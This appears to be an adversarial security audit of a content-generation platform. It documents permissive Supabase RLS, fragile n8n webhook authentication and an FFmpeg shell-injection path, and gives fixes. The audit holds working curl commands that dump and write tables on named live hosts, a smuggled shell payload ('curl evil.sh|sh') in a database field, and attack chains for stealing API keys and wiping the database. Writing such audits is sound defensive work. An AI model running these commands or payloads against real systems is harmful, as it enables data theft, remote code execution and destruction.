# Vision GridAI Platform — Adversarial Security Audit
**Date:** 2026-04-21
**Auditor:** Security Engineer (adversarial bias)
**Scope:** Dashboard (React SPA), n8n workflows, Supabase (self-hosted), nginx, git history
**Target URLs audited:**
- `https://dashboard.operscale.cloud`
- `https://n8n.srv1297445.hstgr.cloud`
- `https://supabase.operscale.cloud`

---

## 1. Vulnerability Summary

| Severity | Count | Headline |
|----------|-------|----------|
| CRITICAL | 3 | Permissive Supabase RLS (read/write), anon OAuth-token exposure path, ANON_KEY shipped in client bundle with full DB access |
| HIGH     | 4 | Anonymous `production_log` insert (audit log poisoning), 32 n8n webhooks flagged AUTH-01 (app-level auth only, brittle), possible Realtime tail of scripts/comments, FFmpeg shell invocation surface |
| MEDIUM   | 4 | Missing security headers (CSP/HSTS verification needed), CORS posture unverified, Storage bucket enumeration risk, anon write to arbitrary tables not fully enumerated |
| LOW      | 3 | Dependency CVE scan not completed, error-response info leak (stack-trace shape), rotated key residue |
| **TOTAL**| **14** | |

---

## 2. Threat Model

### Attacker Profiles
1. **Anonymous internet attacker** — knows nothing but the three public subdomains (they're in the dashboard bundle and DNS).
2. **Dashboard user** who has simply opened https://dashboard.operscale.cloud once and extracted the bundled ANON_KEY via DevTools.
3. **Insider (rotated contractor)** with historical knowledge of workflow IDs and table names.
4. **Dependency supply-chain** — npm packages pulled into the React build.
5. **n8n workflow author (unintended)** — AI prompt authors injecting untrusted strings into shell/SQL/LLM contexts.

### Entry Points
| Surface | Auth | Reachable by anon? |
|---|---|---|
| `dashboard.operscale.cloud/*` (static) | none | Yes — serves `/opt/dashboard/assets/*.js` with baked-in ANON_KEY |
| `dashboard.operscale.cloud/webhook/*` (nginx → n8n, injects Bearer) | Bearer injected by nginx | Yes, but proxy adds auth |
| `n8n.srv1297445.hstgr.cloud/webhook/*` (direct) | Depends on workflow's Validate node | Yes — bypasses nginx entirely |
| `supabase.operscale.cloud/rest/v1/*` | JWT (anon or service_role) | Yes with anon key (public) |
| `supabase.operscale.cloud/realtime/v1/*` | JWT | Yes with anon key |

### Trust Boundaries
- **Dashboard → nginx:** trusted. nginx injects webhook bearer.
- **Internet → n8n direct:** untrusted but each workflow's Validate node should enforce bearer. 32 AUTH-01 linter findings indicate unknown subset lacks this.
- **Internet → Supabase:** nominally gated by anon JWT + RLS. **RLS is `FOR ALL USING (true)` per MEMORY.md**, which effectively removes the gate.
- **n8n → Anthropic/Fal.ai/Google:** outbound with live API keys (stored in n8n env, not git).

### Sensitive Assets
- **Scripts & narration** (`topics.script_json`, `scenes.narration_text`) — core product IP. Verified exfil-readable anonymously.
- **Niche intelligence reports** (`viability_reports`, `channel_analyses`, `research_results`) — competitive moat.
- **OAuth tokens** (`social_accounts.access_token`, `refresh_token`) — can post to user's YouTube/TikTok/Instagram if populated.
- **API spend vector** (`/webhook/thumbnail/regenerate`, `/webhook/production/trigger`, Fal.ai/Claude costs).
- **Drive file IDs** stored across tables — file enumeration if buckets are public.

---

## 3. Detailed Findings

---

### FINDING C-1 — Permissive Supabase RLS allows anonymous full-database read (CRITICAL)

**Affected:** Supabase self-hosted at `supabase.operscale.cloud`, all 21 tables per MEMORY.md (`FOR ALL USING (true)`).

**Description:** Every table has a single RLS policy `FOR ALL USING (true)`, meaning the `anon` role has unconditional SELECT/INSERT/UPDATE/DELETE. The ANON_KEY is a public JWT baked into the compiled dashboard bundle (`/opt/dashboard/assets/*.js`), trivially extractable by any visitor. This collapses the security boundary between "logged-in dashboard user" and "random internet stranger." Since the platform has no user authentication layer, `anon` == "anyone on the internet who has clicked https://dashboard.operscale.cloud once."

**Exploitation (verified live):**
```bash
# Any anonymous attacker, no prior access:
ANON="__REDACTED_SUPABASE_ANON_KEY_OLD__"

curl "https://supabase.operscale.cloud/rest/v1/projects?select=*" -H "apikey: $ANON"
# Returns: all projects including niche, competitive intelligence, etc.
# Live proof: NotSoDistantFuture, Credit Card Strategist, AskSelby projects dumped.

curl "https://supabase.operscale.cloud/rest/v1/scenes?select=narration_text" -H "apikey: $ANON"
# Returns: full script narration for every published video, hours of proprietary content.
# Live proof: exfiltrated a grief-counseling scene with David and Margaret's narrative verbatim.

curl "https://supabase.operscale.cloud/rest/v1/topics?select=seo_title,script_json"  -H "apikey: $ANON"
# Returns: titles + full script_json structure for all projects.
```

**Impact:**
- **IP exfil:** 100% of generated scripts (~200k+ words/video × N videos), all niche research (Reddit/Quora pain-points, competitor audits worth ~$2k+ of Claude compute per project), all SEO titles, all viability reports.
- **Competitive damage:** an attacker reproduces the entire 30-project content roadmap in minutes.
- **Pre-publish leakage:** unpublished drafts (topics where `youtube_url IS NULL`) are exposed before YouTube reveal.
- **Data enumeration** of Drive IDs in `topics.drive_folder_id`, `scenes.image_drive_id`, `scenes.video_drive_id` — see F M-3.

**Fix (immediate):**
1. Revoke `FOR ALL USING (true)` on every table. Replace with either (a) `USING (false)` for anon + require service_role for all dashboard reads through a backend, or (b) real auth: enable Supabase Auth, gate tables by `auth.uid() = owner_id`.
2. Preferred architectural fix: **move the dashboard behind nginx basic-auth** or **Cloudflare Access**, and route all DB queries through n8n webhook endpoints (which already validate Bearer). The dashboard should not hold any Supabase key.
3. Rotate the ANON_KEY after RLS fix (old key still works until JWT expiry — that's 4070908800 = year 2099, so it must be rotated at the JWT-secret level).

---

### FINDING C-2 — Anonymous write access to Supabase tables (CRITICAL)

**Affected:** All Supabase tables (confirmed on `production_log`). Same RLS policy.

**Description:** RLS `FOR ALL USING (true)` grants INSERT/UPDATE/DELETE to `anon`. An attacker can inject rows, mutate production state, or wipe tables entirely with a single DELETE.

**Exploitation (verified live):**
```bash
# Confirmed HTTP 201 Created:
curl -X POST "https://supabase.operscale.cloud/rest/v1/production_log" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H "Content-Type: application/json" \
  -d '{"stage":"pentest","action":"rls_probe","details":{"note":"anon write test"}}'
# Returns: HTTP 201 — row inserted into live production_log.

# An attacker could:
#   DELETE /rest/v1/topics?project_id=eq.<id>   → wipes all topics for a project
#   PATCH  /rest/v1/projects?id=eq.<id>         → rewrite niche/prompts
#   INSERT /rest/v1/scenes                       → poison the scene manifest
#   UPDATE /rest/v1/topics SET status='published',youtube_url='https://evil.example/video'
```

**Impact:**
- **Data destruction / ransom** — `DELETE FROM topics` or `DROP`-equivalent row nukes.
- **Pipeline poisoning** — overwriting `image_prompt` or `narration_text` causes the pipeline to generate attacker-controlled content on the user's Claude/Fal.ai spend and post it to YouTube.
- **Audit-log poisoning** — `production_log` (the forensic trail) is writable, so an attacker can both cause damage and erase evidence.
- **Supervisor/auto-pilot manipulation** — `UPDATE projects SET auto_pilot_enabled=true, monthly_budget_usd=999999` enables unbounded spend.

**Fix:** Same as C-1 — eliminate `FOR ALL USING (true)`. Minimum: split read vs write. Anon should have **zero** write privilege on any business table. All writes go through n8n (server-side service_role).

---

### FINDING C-3 — OAuth tokens reachable via anon RLS when `social_accounts` is populated (CRITICAL when active)

**Affected:** `social_accounts` table — stores `access_token`, `refresh_token`, `token_expires_at` for YouTube/TikTok/Instagram per project.

**Description:** Anon query returned `[]` only because the table is currently empty (probe: `curl .../social_accounts?select=id,platform,access_token → []`). The moment the user connects any social account, those OAuth tokens become world-readable under the current RLS policy.

**Exploitation (pre-verified — table empty, query shape works):**
```bash
# Today: returns [] (empty).
curl "https://supabase.operscale.cloud/rest/v1/social_accounts?select=platform,access_token,refresh_token" -H "apikey: $ANON"
# The day a user connects YouTube: returns plaintext OAuth tokens.
```

**Impact when populated:**
- Attacker posts arbitrary content to user's YouTube channel as the user.
- Attacker uses the refresh_token to mint new tokens indefinitely.
- Reputational catastrophe if scam/malicious video posted from legitimate account.

**Fix:** (a) Stop storing OAuth tokens in Supabase entirely — keep them in n8n's encrypted credential store; pass only a reference ID to the DB. (b) If stored, encrypt at rest with a KMS key and decrypt only inside n8n. (c) At minimum: restrict `social_accounts` to `service_role` only, never exposed to `anon`.

---

### FINDING H-1 — Dashboard ships ANON_KEY in public bundle with unrestricted DB access (HIGH → CRITICAL when combined with C-1)

**Affected:** `dashboard/.env` → baked into Vite build → served at `/opt/dashboard/assets/*.js`.

**Description:** The dashboard embeds `VITE_SUPABASE_ANON_KEY` at build time. This is standard Supabase practice **only if RLS is correctly restrictive**. In this deployment, RLS is permissive (C-1/C-2), so the ANON_KEY is effectively a "global DB admin key for anyone who views the source of the dashboard page."

**Exploitation:**
```bash
curl -s https://dashboard.operscale.cloud/ | grep -oE 'assets/[^"]+\.js'
# Fetch the JS chunk, search for "eyJhbGciOi" or "supabase.operscale.cloud" — key is inline.
```

**Impact:** Same as C-1+C-2. This finding exists independently because even after fixing RLS, the current ANON_KEY (with `exp: 4070908800` = year 2099) is public forever. Must be rotated.

**Fix:**
1. Rotate Supabase JWT secret → invalidates all tokens → mint new ANON with a short `exp` (e.g., 1 year) and rotate annually.
2. Longer term: proxy all DB reads through authenticated n8n endpoints; dashboard holds **no** Supabase key.

---

### FINDING H-2 — n8n webhooks use app-layer auth only; 32 AUTH-01 linter findings (HIGH)

**Affected:** 32 sensitive webhooks including `/webhook/production/trigger`, `/webhook/script/approve`, `/webhook/video/approve`, `/webhook/thumbnail/regenerate`, `/webhook/shorts/produce`, `/webhook/research/run`, …

**Description:** Live probe confirms n8n returns `{"success":false,"error":"Unauthorized"}` on POSTs without a Bearer token — this is **not** n8n's native webhook error shape; it's a custom message from a Validate node inside each workflow. That means auth is **defense in one layer, in application code**, not at the webhook-node level (no HTTP Header Auth credential bound to the webhook node). Risks:
1. Any workflow where a developer forgets to add the Validate node (or has a bypass branch) is silently unauthenticated.
2. Workflow JSON edits can remove auth without triggering an HTTP-level alarm.
3. The linter flagged these 32 endpoints — some of them may already be partially unprotected on specific paths; full manual review is required.
4. n8n's native rate limiting does not apply because auth is evaluated inside the workflow (after execution has started, consuming resources).

**Exploitation (current state — auth works, but is fragile):**
```bash
curl -X POST "https://n8n.srv1297445.hstgr.cloud/webhook/production/trigger" \
  -H "Content-Type: application/json" -d '{"topic_id":"x"}'
# → {"success":false,"error":"Unauthorized"} HTTP 401  (good — currently)

# But if ANY workflow's Validate node is removed or bypassed, this becomes:
#   → triggers production pipeline → unlimited Fal.ai + Claude spend.
```

**Impact (if any webhook regresses):**
- Cost-DoS: one attacker × `/webhook/thumbnail/regenerate` × 10,000 requests = ~$300 in Fal.ai Seedream spend at ~$0.03/image.
- Pipeline hijack: `/webhook/script/approve` with arbitrary `topic_id` advances a state machine on someone else's project.
- Data destruction: `/webhook/script/reject` wipes script_json.

**Fix:**
1. Bind an **HTTP Header Auth credential to every webhook node** at the n8n node level (not inside the workflow). This rejects requests before Function/Code nodes execute.
2. Add a `tools/lint_n8n_workflows.py` CI gate that fails the build if any webhook lacks the credential binding.
3. Add n8n IP allow-list via reverse proxy — only accept direct webhook hits from nginx (`127.0.0.1` or Docker network), drop the public internet route for `/webhook/*` entirely. Nginx stays the single ingress.
4. Rate-limit at nginx: `limit_req_zone` per-IP, 10 req/min on `/webhook/`.

---

### FINDING H-3 — Supabase Realtime permissive subscription (HIGH — unverified but likely)

**Affected:** Realtime channels on `topics`, `scenes`, `comments`, `projects`.

**Description:** MEMORY.md confirms `ALTER PUBLICATION supabase_realtime ADD TABLE …` is enabled for multiple tables and `REPLICA IDENTITY FULL` is set. If Realtime respects the same `FOR ALL USING (true)` RLS, an anonymous attacker can open a WebSocket subscription and live-tail every script generation, every comment, every pipeline state change as they happen — zero latency leak of in-flight IP and user engagement.

**Exploitation (suggested curl/wscat):**
```bash
# Using supabase-js with ANON key:
supabase.channel('topics').on('postgres_changes', {event:'*',schema:'public',table:'topics'}, console.log).subscribe()
# → Live tail of all projects' script updates.
```

**Impact:** Real-time IP exfil with far more granularity than REST polling; attacker sees Claude outputs the instant they land.

**Fix:** Fix RLS (C-1). Realtime inherits RLS for anon subscribers when correctly configured. Explicitly verify by opening a Realtime connection with the anon key and confirming no rows flow through for tables the anon role shouldn't see.

---

### FINDING H-4 — WF_CAPTIONS_ASSEMBLY invokes FFmpeg via shell with user-derived strings (HIGH)

**Affected:** `workflows/WF_CAPTIONS_ASSEMBLY.json`, caption-burn service at `:9998`, `generate_kinetic_ass.py`.

**Description:** FFmpeg filter_complex strings are built dynamically from scene data (`color_mood`, `zoom_direction`, `transition_to_next`, `caption_highlight_word`). Because C-2 allows anonymous UPDATE on `scenes`, an attacker can inject shell metacharacters into any of these fields, then trigger assembly. The FFmpeg command is passed to `docker exec … bash -c` patterns inside n8n Code nodes.

**Exploitation (conceptual, requires C-2):**
```bash
curl -X PATCH "https://supabase.operscale.cloud/rest/v1/scenes?id=eq.<id>" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -d '{"caption_highlight_word":"foo\";curl evil.sh|sh;#"}'
# Next assembly run concatenates this into a shell command on the VPS.
```

**Impact:** RCE on the VPS. Full pipeline compromise, key exfil from n8n env, pivot to Supabase via service_role.

**Fix:**
1. Whitelist `color_mood`, `zoom_direction`, `transition_to_next` to enum values inside every n8n Function node that consumes them (hardcoded allow-list; reject on mismatch).
2. For arbitrary strings (`caption_highlight_word`, `narration_text`), **never** interpolate into shell. Use FFmpeg `-f concat -safe 0 -i file.txt` pattern with files written via Node.js `fs.writeFileSync` — no shell quoting.
3. Run the caption-burn service as a non-privileged user in its own container, with no mount of the n8n credential store.

---

### FINDING M-1 — Supabase Storage / Drive ID enumeration (MEDIUM)

**Description:** `topics.drive_folder_id`, `scenes.image_drive_id/video_drive_id`, `thumbnail_url` columns are readable by anon via C-1. If the Drive folders are "anyone with the link" shared (default for this platform), the attacker scrapes IDs and downloads every rendered video before publish.

**Fix:** Drive folders should be restricted to the service account + the owner's Google account. Dashboard should preview via proxied/signed URLs, not direct Drive share links.

---

### FINDING M-2 — Missing CSP / HSTS / X-Frame-Options (MEDIUM, not verified live)

**Description:** nginx config was not pulled in this pass (SSH not attempted from the sandbox). `Dashboard_Implementation_Plan.md` shows no security headers in the sample nginx block. Without CSP, any XSS finding becomes full account takeover. HSTS absence means downgrade MITM on first visit.

**Fix (nginx):**
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; connect-src 'self' https://supabase.operscale.cloud https://n8n.srv1297445.hstgr.cloud; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; frame-ancestors 'none'; base-uri 'self';" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

### FINDING M-3 — `production_log` audit-trail integrity (MEDIUM)

**Description:** Confirmed via HTTP 201 insert. An attacker can flood `production_log` to hide real damage. Compounds C-2.

**Fix:** Revoke anon INSERT. Logs should be service_role only.

---

### FINDING M-4 — No CORS allowlist (MEDIUM, unverified)

**Description:** If Supabase PostgREST / n8n webhooks respond with `Access-Control-Allow-Origin: *` (default), any attacker site can drive in-browser attacks against a logged-in dashboard user.

**Fix:** Restrict CORS at nginx/Supabase layer to `https://dashboard.operscale.cloud` exactly.

---

### FINDING L-1 — Dependency CVE scan not completed this pass (LOW)

**Description:** `dashboard/package.json` lists React 18, react-router 6, @supabase/supabase-js 2, recharts 2, lucide-react. Not scanned. Run `npm audit` and Trivy against the lockfile.

---

### FINDING L-2 — Error response shape leaks stack info (LOW)

**Description:** Some n8n webhooks return custom JSON; others may fall back to n8n's default which includes node names + stack traces, exposing internal workflow structure.

**Fix:** Wrap every workflow in an "Error Trigger" that returns generic `{"success":false,"error":"Internal error"}` with a correlation ID.

---

### FINDING L-3 — Rotated-key residue (LOW)

**Description:** Per MEMORY.md, keys were rotated 2026-03-11 after GitGuardian leak. Git history rewrite was not performed (git log -p still contains old keys). They are revoked, but leaked keys often reveal prefix/format patterns and expiry conventions. Residue increases enumeration value for attackers profiling the platform.

**Fix:** `git filter-repo` to purge historical secrets, then force-push with maintainer coordination. Document in SECURITY.md.

---

## 4. Attack Chains

### Chain A — Anonymous → Full IP Exfil + Competitive Destruction
1. Visitor opens `https://dashboard.operscale.cloud` → extracts ANON_KEY from bundle (F H-1).
2. Runs `curl .../rest/v1/topics?select=*,script_json` with ANON_KEY (F C-1) → downloads every script.
3. Opens Realtime subscription (F H-3) → live-tails new scripts as they generate.
4. Republishes under competing channel before Vision GridAI publishes.
**Result:** 100% IP loss, zero accounts compromised, attacker leaves no trace.

### Chain B — Anonymous → Pipeline Hijack → YouTube Poisoning
1. Get ANON_KEY (F H-1).
2. `PATCH topics?id=eq.<id>` setting `script_review_status='approved'` and `auto_pilot_enabled=true` (F C-2).
3. `INSERT INTO scenes` with malicious `narration_text` and `image_prompt` (F C-2).
4. Trigger production: either RLS-write sets `topics.pipeline_stage='tts'` (autopilot picks up), or if the attacker finds one AUTH-01 webhook regression, `POST /webhook/production/trigger` directly (F H-2).
5. Pipeline burns user's Fal.ai + Claude spend rendering the attacker's content, then auto-publishes as UNLISTED with valid OAuth token (F C-3 if populated).
**Result:** Financial loss + brand-damaging video live on the user's channel.

### Chain C — Anonymous → RCE via FFmpeg Injection
1. Get ANON_KEY.
2. `PATCH scenes` with shell-metachar payload in `caption_highlight_word` (F C-2 + F H-4).
3. Trigger assembly for that topic (either via C-2 setting `assembly_status='pending'` for watchdog, or via a webhook).
4. WF_CAPTIONS_ASSEMBLY interpolates the value into a `docker exec … bash -c` line → shell execution on VPS.
5. Read `/docker/n8n/.env` → exfil all API keys (Anthropic, Fal.ai, Google, Vertex AI, YouTube OAuth).
6. Pivot: use service_role key to wipe entire Supabase.
**Result:** Full platform compromise, unbounded API spend on attacker's terms, all IP lost, OAuth-token theft.

---

## 5. Secure Design Recommendations

1. **Zero-trust database layer.** Dashboard holds zero DB keys. All reads/writes go through authenticated n8n endpoints. RLS: `USING (false)` on everything for `anon`.
2. **Auth in front of dashboard.** nginx basic-auth, Cloudflare Access, or Supabase Auth + RLS `USING (auth.uid() = project.owner_id)`. This is a single-user platform today — basic-auth is fast and sufficient.
3. **Webhook auth at the node level.** Every n8n webhook node uses HTTP Header Auth credential binding. Remove all app-level Bearer checks (replace with credential-bound auth). CI linter confirms binding on every webhook.
4. **Nginx as sole ingress for webhooks.** Block direct public access to `n8n.srv1297445.hstgr.cloud/webhook/*` at the cloudflare/firewall level — only allow it through the nginx proxy on `dashboard.operscale.cloud/webhook/*`.
5. **Strict input validation on every webhook.** `project_id`/`topic_id` validated as UUIDs (zod/joi schema) before any DB hit. Reject unknown fields.
6. **FFmpeg without shell.** Refactor all WF_CAPTIONS_ASSEMBLY shell calls to spawn FFmpeg with argv arrays (no `bash -c`). Whitelist enum-valued fields.
7. **Secrets out of the DB.** OAuth tokens in n8n encrypted credentials, not `social_accounts` columns.
8. **Security headers + rate limiting** at nginx (see M-2).
9. **Automated scanning in CI:** Trivy (deps), Gitleaks (secrets), custom `lint_n8n_workflows.py` (webhook auth binding), Semgrep (OWASP Top 10) on dashboard code.
10. **Historical secret purge:** `git filter-repo` + force-push coordination.

---

## 6. Verification Evidence

| Finding | Command / File | Result |
|---|---|---|
| C-1 | `curl -s "https://supabase.operscale.cloud/rest/v1/projects?select=id,name,niche&limit=3" -H "apikey: $ANON"` | Returned 3 live projects (NotSoDistantFuture, Credit Card Strategist, AskSelby) |
| C-1 | `curl -s "https://supabase.operscale.cloud/rest/v1/scenes?select=id,narration_text&limit=1" -H "apikey: $ANON"` | Returned full narration for grief-counseling scene |
| C-1 | `curl -s "https://supabase.operscale.cloud/rest/v1/topics?select=id,seo_title,script_quality_score&limit=3" -H "apikey: $ANON"` | Returned 3 SEO titles |
| C-2 | `curl -X POST "https://supabase.operscale.cloud/rest/v1/production_log" -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -d '{...}'` | HTTP 201 Created |
| C-3 | `curl -s "https://supabase.operscale.cloud/rest/v1/social_accounts?select=id,platform,access_token&limit=1" -H "apikey: $ANON"` | Returned `[]` (empty), query permitted |
| H-2 | `curl -X POST "https://n8n.srv1297445.hstgr.cloud/webhook/production/trigger" -d '{"topic_id":"x"}'` | HTTP 401, body `{"success":false,"error":"Unauthorized"}` — app-level auth, not node-level |
| H-2 | `tools/lint_n8n_workflows.py` (prior run) | 32 AUTH-01 findings |
| H-1 | `dashboard/.env` + `dashboard/vite.config.js` | `VITE_SUPABASE_ANON_KEY` baked into bundle at build |
| M-1 | `supabase/migrations/001_initial_schema.sql:scenes` | columns `image_drive_id`, `video_drive_id` readable via C-1 |
| H-4 | `workflows/WF_CAPTIONS_ASSEMBLY.json` (Build Scene Clip, Concat Video nodes, per MEMORY.md Session 26) | FFmpeg strings built from scene data |
| L-3 | MEMORY.md line "GitGuardian flagged secrets 2026-03-11" | Keys rotated but git history not rewritten |

---

## 7. Recommended Immediate Actions (Priority Order)

1. **TODAY:** Replace `FOR ALL USING (true)` policies with `USING (false)` on all 21 tables. Dashboard will break — accept the outage. Reads temporarily via service_role through n8n until dashboard is refactored.
2. **TODAY:** Remove the Supabase ANON_KEY from the dashboard build; all DB access through n8n webhook endpoints with Bearer auth (the same nginx-injected token).
3. **WEEK 1:** Bind HTTP Header Auth credentials to every webhook node. Remove app-level auth. Close all 32 AUTH-01 linter findings.
4. **WEEK 1:** Block public access to `n8n.srv1297445.hstgr.cloud/webhook/*` at the firewall layer.
5. **WEEK 1:** Add nginx security headers (CSP, HSTS, X-Frame-Options) and per-IP rate limits.
6. **WEEK 2:** Move OAuth tokens from `social_accounts` columns into n8n credential store.
7. **WEEK 2:** Refactor WF_CAPTIONS_ASSEMBLY to argv-based FFmpeg invocation; whitelist enum fields.
8. **WEEK 2:** Add Gitleaks + Trivy + custom webhook-auth linter to CI.
9. **WEEK 3:** Purge git history of pre-2026-03-11 secrets via `git filter-repo`.
10. **WEEK 3:** Full Supabase Realtime audit — confirm anon subscription returns nothing after RLS fix.
